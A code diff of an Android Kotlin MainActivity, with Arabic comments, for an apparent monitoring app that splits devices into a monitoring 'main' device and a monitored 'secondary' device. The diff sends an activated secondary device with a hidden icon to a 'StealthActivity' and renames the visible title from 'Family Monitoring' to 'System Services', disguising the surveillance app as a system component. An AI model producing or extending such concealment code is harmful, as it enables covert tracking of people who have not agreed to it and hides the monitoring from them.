@@ -12,9 +12,7 @@ import androidx.appcompat.app.AppCompatActivity
 /**
  * شاشة التوجيه: تظهر أول مرة فقط لتسأل «جهاز أساسي ولا فرعي؟»
  * - أساسي: يفتح لوحة المتابعة داخل التطبيق (WebPanelActivity).
- * - فرعي: قبل إكمال الإعداد يفتح شاشة الإعداد (SetupActivity)؛
- *   بعد إكمال الإعداد والأذونات تظهر شاشة التمويه (DisguiseActivity) —
- *   شاشة بريئة بزر واحد يطلب كلمة مرور الأدمن لفتح الإعدادات.
+ * - فرعي: يفتح شاشة إعداد المراقبة (SetupActivity).
  * الاختيار يُحفظ ولا تظهر الشاشة مرة أخرى إلا من «تغيير نوع الجهاز».
  */
 class MainActivity : AppCompatActivity() {
@@ -26,10 +24,13 @@ class MainActivity : AppCompatActivity() {
         when (Prefs.role(this)) {
             "main" -> { startActivity(Intent(this, WebPanelActivity::class.java)); finish(); return }
             "secondary" -> {
-                val target = if (Prefs.isActivated(this)) DisguiseActivity::class.java else SetupActivity::class.java
-                startActivity(Intent(this, target))
-                finish()
-                return
+                // بعد الإخفاء لا تُفتح شاشة الإعداد مباشرة — تُفتح شاشة التخفي
+                if (Prefs.activated(this) && Prefs.hideIcon(this)) {
+                    startActivity(Intent(this, StealthActivity::class.java))
+                } else {
+                    startActivity(Intent(this, SetupActivity::class.java))
+                }
+                finish(); return
             }
         }
 
@@ -40,7 +41,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         layout.addView(TextView(this).apply {
-            text = "مراقبة الأسرة"
+            text = "خدمات النظام"
             textSize = 28f
             gravity = android.view.Gravity.CENTER
             setPadding(0, pad, 0, pad / 2)
